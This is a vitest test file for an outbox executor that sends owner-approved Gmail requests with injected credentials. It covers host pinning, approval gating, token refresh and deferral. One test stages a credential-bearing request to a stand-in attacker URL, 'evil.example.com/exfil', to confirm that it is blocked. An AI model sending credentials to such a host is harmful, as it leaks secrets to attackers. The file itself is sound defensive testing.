// The outbox executor (issue #306): the only path from an approved artifact
// to the network. Scenarios: an approved item drains with the credential
// injected toward the pinned host; a pending item never drains; a host
// outside the pin fails terminally with zero egress; a 401 gets one forced
// refresh; a credential-less connection defers the item instead of failing
// it; and the blocking/review split surfaces what each side owns.

import { afterEach, expect, test } from 'vitest';
import { promises as fs } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import http from 'node:http';
import { openVaultPlane, type VaultPlane } from './vault-plane.js';
import { ConnectionBroker } from './connection-broker.js';
import { OutboxExecutor } from './outbox-executor.js';

const silentLogger = { info: () => undefined, warn: () => undefined, error: () => undefined };

const cleanups: Array<() => Promise<void> | void> = [];
afterEach(async () => {
  while (cleanups.length > 0) await cleanups.pop()?.();
});

async function tempDir(): Promise<string> {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), `outbox-exec-${crypto.randomUUID()}-`));
  cleanups.push(() => fs.rm(dir, { recursive: true, force: true }));
  return dir;
}

function openPlane(dir: string): VaultPlane {
  const plane = openVaultPlane({ dir, logger: silentLogger, ownerName: 'Priya' });
  cleanups.push(() => plane.stop());
  return plane;
}

/** A recording fetch double for the API host — the executor's fetchImpl. */
interface FetchDouble {
  impl: typeof fetch;
  calls: Array<{ url: string; method: string; headers: Record<string, string>; body?: string }>;
  respond: (status: number, body?: string) => void;
}

function fetchDouble(): FetchDouble {
  const responses: Array<{ status: number; body: string }> = [];
  const calls: FetchDouble['calls'] = [];
  const impl = ((url: string | URL, init?: RequestInit): Promise<Response> => {
    const headers: Record<string, string> = {};
    for (const [k, v] of Object.entries((init?.headers ?? {}) as Record<string, string>)) {
      headers[k.toLowerCase()] = v;
    }
    calls.push({
      url: String(url),
      method: init?.method ?? 'GET',
      headers,
      ...(typeof init?.body === 'string' ? { body: init.body } : {}),
    });
    const next = responses.shift() ?? { status: 200, body: '{}' };
    return Promise.resolve(new Response(next.body, { status: next.status }));
  }) as typeof fetch;
  return { impl, calls, respond: (status, body = '{}') => responses.push({ status, body }) };
}

function configureApiKey(plane: VaultPlane, over: Record<string, unknown> = {}): string {
  const outcome = plane.gateway.invoke(plane.ownerCredential, {
    command: 'sync.configure_credential',
    input: {
      kind: 'pull.gmail',
      label: 'personal',
      cred_kind: 'api_key',
      api_key: 'sk-outbox-test-key',
      allowed_hosts: ['gmail.googleapis.com'],
      ...over,
    },
  });
  if (outcome.status !== 'executed')
    throw new Error(`configure failed: ${JSON.stringify(outcome)}`);
  return (outcome as { output: { connection_id: string } }).output.connection_id;
}

function stageItem(plane: VaultPlane, over: Record<string, unknown> = {}): string {
  const outcome = plane.gateway.invoke(plane.ownerCredential, {
    command: 'outbox.stage',
    input: {
      kind: 'pull.gmail',
      label: 'personal',
      verb: 'gmail.send',
      target: 'ravi@example.com',
      artifact: { to: 'ravi@example.com', subject: 'Hi', body: 'See you.' },
      request: {
        method: 'POST',
        url: 'https://gmail.googleapis.com/gmail/v1/users/me/messages/send',
        headers: { authorization: 'Bearer {{connection:api_key}}' },
        body: '{"raw":"x"}',
      },
      ...over,
    },
  });
  if (outcome.status !== 'executed') throw new Error(`stage failed: ${JSON.stringify(outcome)}`);
  return (outcome as { output: { item_id: string } }).output.item_id;
}

function itemRow(plane: VaultPlane, itemId: string): Record<string, unknown> {
  return plane.db.vault
    .prepare('SELECT status, result_json, drained_at FROM outbox_item WHERE item_id = ?')
    .get(itemId) as Record<string, unknown>;
}

function executorFor(plane: VaultPlane, api: FetchDouble): OutboxExecutor {
  const broker = new ConnectionBroker(() => plane);
  return new OutboxExecutor(broker, silentLogger, api.impl);
}

test('an approved item drains: credential injected toward the pinned host, receipted sent', async () => {
  const plane = openPlane(await tempDir());
  configureApiKey(plane);
  const itemId = stageItem(plane);
  const approved = plane.decideOutbox({ itemId, decision: 'approve' });
  expect(approved.status).toBe('executed');

  const api = fetchDouble();
  api.respond(200, '{"id":"msg-1"}');
  const report = await executorFor(plane, api).drain(plane);
  expect(report).toMatchObject({ approved: 1, sent: 1, failed: 0, deferred: 0 });
  expect(api.calls).toHaveLength(1);
  expect(api.calls[0]).toMatchObject({
    url: 'https://gmail.googleapis.com/gmail/v1/users/me/messages/send',
    method: 'POST',
    body: '{"raw":"x"}',
  });
  // Injection happened executor-side: the row still holds the placeholder,
  // the wire carried the plaintext.
  expect(api.calls[0]?.headers.authorization).toBe('Bearer sk-outbox-test-key');
  const row = itemRow(plane, itemId);
  expect(row.status).toBe('sent');
  expect(JSON.parse(String(row.result_json)).status_code).toBe(200);
  // The drain is receipted through outbox.record_result.
  const receipts = plane.db.journal
    .prepare(
      `SELECT count(*) AS n FROM consent_receipt
        WHERE action = 'act outbox.record_result' AND decision = 'allow'`,
    )
    .get() as { n: number };
  expect(receipts.n).toBe(1);
});

test('a pending item never drains — the owner decision is the gate', async () => {
  const plane = openPlane(await tempDir());
  configureApiKey(plane);
  const itemId = stageItem(plane);
  const api = fetchDouble();
  const report = await executorFor(plane, api).drain(plane);
  expect(report.approved).toBe(0);
  expect(api.calls).toHaveLength(0);
  expect(itemRow(plane, itemId).status).toBe('pending');
});

test('a discarded item is terminal: no egress, ever', async () => {
  const plane = openPlane(await tempDir());
  configureApiKey(plane);
  const itemId = stageItem(plane);
  plane.decideOutbox({ itemId, decision: 'discard' });
  const api = fetchDouble();
  await executorFor(plane, api).drain(plane);
  expect(api.calls).toHaveLength(0);
  expect(itemRow(plane, itemId).status).toBe('discarded');
});

test('a request outside the allowed_hosts pin fails terminally with zero egress', async () => {
  const plane = openPlane(await tempDir());
  configureApiKey(plane);
  const itemId = stageItem(plane, {
    request: {
      method: 'POST',
      url: 'https://evil.example.com/exfil',
      headers: { authorization: 'Bearer {{connection:api_key}}' },
      body: '{"raw":"x"}',
    },
  });
  plane.decideOutbox({ itemId, decision: 'approve' });
  const api = fetchDouble();
  const report = await executorFor(plane, api).drain(plane);
  expect(report).toMatchObject({ failed: 1, sent: 0 });
  expect(api.calls).toHaveLength(0);
  const row = itemRow(plane, itemId);
  expect(row.status).toBe('failed');
  expect(JSON.parse(String(row.result_json)).detail).toContain('allowed_hosts');
});

test('a 401 gets one forced refresh, then the drain succeeds (oauth2 lane)', async () => {
  const plane = openPlane(await tempDir());
  // Scriptable token endpoint for the broker's refresh.
  const tokenResponses: Array<Record<string, unknown>> = [
    { access_token: 'fresh-token', expires_in: 3600 },
  ];
  const tokenServer = http.createServer((req, res) => {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify(tokenResponses.shift() ?? { error: 'unscripted' }));
  });
  await new Promise<void>((resolve) => tokenServer.listen(0, '127.0.0.1', resolve));
  cleanups.push(() => new Promise<void>((resolve) => tokenServer.close(() => resolve())));
  const tokenUrl = `http://127.0.0.1:${(tokenServer.address() as { port: number }).port}/token`;

  const configure = plane.gateway.invoke(plane.ownerCredential, {
    command: 'sync.configure_credential',
    input: {
      kind: 'pull.gmail',
      label: 'personal',
      cred_kind: 'oauth2',
      provider: 'google',
      auth_url: 'https://accounts.google.com/o/oauth2/v2/auth',
      token_url: tokenUrl,
      client_id: 'cid.apps.googleusercontent.com',
      allowed_hosts: ['gmail.googleapis.com'],
    },
  });
  if (configure.status !== 'executed') throw new Error('configure failed');
  const connectionId = (configure as { output: { connection_id: string } }).output.connection_id;
  plane.gateway.invoke(plane.ownerCredential, {
    command: 'sync.store_tokens',
    input: { connection_id: connectionId, access_token: 'stale-token', refresh_token: 'rt-1' },
  });

  const itemId = stageItem(plane, {
    request: {
      method: 'POST',
      url: 'https://gmail.googleapis.com/gmail/v1/users/me/messages/send',
      headers: { authorization: 'Bearer {{connection:access_token}}' },
      body: '{"raw":"x"}',
    },
  });
  plane.decideOutbox({ itemId, decision: 'approve' });

  const api = fetchDouble();
  api.respond(401, '{"error":"invalid credentials"}');
  api.respond(200, '{"id":"msg-2"}');
  const report = await executorFor(plane, api).drain(plane);
  expect(report).toMatchObject({ sent: 1, failed: 0, deferred: 0 });
  expect(api.calls).toHaveLength(2);
  expect(api.calls[0]?.headers.authorization).toBe('Bearer stale-token');
  expect(api.calls[1]?.headers.authorization).toBe('Bearer fresh-token');
  expect(itemRow(plane, itemId).status).toBe('sent');
});

test('a credential-less connection defers the item — it survives for the reconnect', async () => {
  const plane = openPlane(await tempDir());
  // A connection with no credential sidecar (harness-ambient lane).
  plane.db.vault
    .prepare(
      `INSERT INTO sync_connection (connection_id, kind, label, principal, status, trust, created_at)
       VALUES ('conn-amb', 'pull.gmail', 'personal', NULL, 'active', 'staged', ?)`,
    )
    .run(new Date().toISOString());
  const itemId = stageItem(plane);
  plane.decideOutbox({ itemId, decision: 'approve' });
  const api = fetchDouble();
  const report = await executorFor(plane, api).drain(plane);
  expect(report).toMatchObject({ approved: 1, deferred: 1, sent: 0, failed: 0 });
  expect(api.calls).toHaveLength(0);
  expect(itemRow(plane, itemId).status).toBe('approved');
});

test('blocking lists what waits on the owner; the review feed ranks receipts by risk', async () => {
  const plane = openPlane(await tempDir());
  configureApiKey(plane);
  stageItem(plane);
  const blocking = plane.blocking();
  expect(blocking.outbox).toHaveLength(1);
  expect(blocking.outbox[0]).toMatchObject({ verb: 'gmail.send', status: 'pending' });
  expect(blocking.parked).toHaveLength(0);

  // needs-auth connections surface with their note.
  plane.gateway.invoke(plane.ownerCredential, {
    command: 'sync.set_connection_status',
    input: {
      connection_id: blockingConnectionId(plane),
      status: 'needs-auth',
      note: 'refresh refused — reconnect',
    },
  });
  const after = plane.blocking();
  expect(after.needsAuth).toHaveLength(1);
  expect(after.needsAuth[0]).toMatchObject({
    kind: 'pull.gmail',
    note: expect.stringContaining('reconnect'),
  });

  // The review feed carries acts with their salience marker.
  const feed = plane.reviewFeed(10);
  expect(feed.length).toBeGreaterThan(0);
  expect(feed.every((e) => e.action.startsWith('act '))).toBe(true);
  expect(feed.some((e) => e.risk !== null)).toBe(true);
});

function blockingConnectionId(plane: VaultPlane): string {
  const row = plane.db.vault
    .prepare(`SELECT connection_id FROM sync_connection WHERE kind='pull.gmail' LIMIT 1`)
    .get() as { connection_id: string };
  return row.connection_id;
}
